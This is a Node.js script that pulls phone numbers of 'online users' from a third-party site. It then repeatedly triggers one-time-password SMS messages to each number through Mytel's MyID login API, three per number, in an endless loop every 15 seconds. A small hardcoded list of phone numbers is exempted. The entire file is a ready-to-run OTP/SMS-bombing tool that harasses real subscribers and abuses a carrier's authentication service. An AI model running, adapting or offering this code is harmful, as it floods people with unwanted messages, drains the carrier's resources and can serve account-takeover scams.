const axios = require("axios");
const FormData = require("form-data");

// Block list
const blockList = [
  "09687071269",
  "09687071269",
  "09670871425",
  "09664810586",
  "09681307197"
];

// ✅ Random phone
function randomPhone() {
    return "09" + Math.floor(Math.random() * 1e8).toString().padStart(8, "0");
}

// ✅ POST to online_users.php
async function fetchOnlineUsers() {
    try {
        const form = new FormData();
        form.append("phone", randomPhone()); // required field

        const res = await axios.post("https://ironcoder.site/ironmyid/online_users.php", form, {
            headers: form.getHeaders()
        });

        if (res.data.success && Array.isArray(res.data.online_users)) {
            console.log(`🌐 Total online users: ${res.data.total_online_users}`);
            return res.data.online_users;
        } else {
            console.log("❌ No online users returned.");
            return [];
        }
    } catch (e) {
        console.error("❌ Error fetching online users:", e.message);
        return [];
    }
}

// ✅ Send OTP 3 times
async function sendOtp(phone) {
    for (let i = 0; i < 3; i++) {
        try {
            const url = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${phone}`;
            const res = await axios.get(url);
            if (res.status === 200) {
                console.log(`✅ (${i + 1}/3) OTP sent to ${phone}`);
            } else {
                console.log(`⚠️ (${i + 1}/3) Failed for ${phone} - Status: ${res.status}`);
            }
        } catch (e) {
            console.error(`❌ (${i + 1}/3) Error sending to ${phone}:`, e.message);
        }
    }
}

// ✅ 1 round
async function loopOnce() {
    const phones = await fetchOnlineUsers();
    let count = 0;

    for (const phone of phones) {
        if (blockList.includes(phone)) {
            console.log(`⏭ Skipped blocked number: ${phone}`);
            continue;
        }
        await sendOtp(phone);
        count++;
    }

    console.log(`✅ Round complete. Sent OTP to ${count} online users.\n`);
}

// 🔁 Forever
async function loopForever() {
    while (true) {
        await loopOnce();
        console.log("🔁 Waiting 15s before next round...\n");
        await new Promise(r => setTimeout(r, 15000));
    }
}

loopForever();
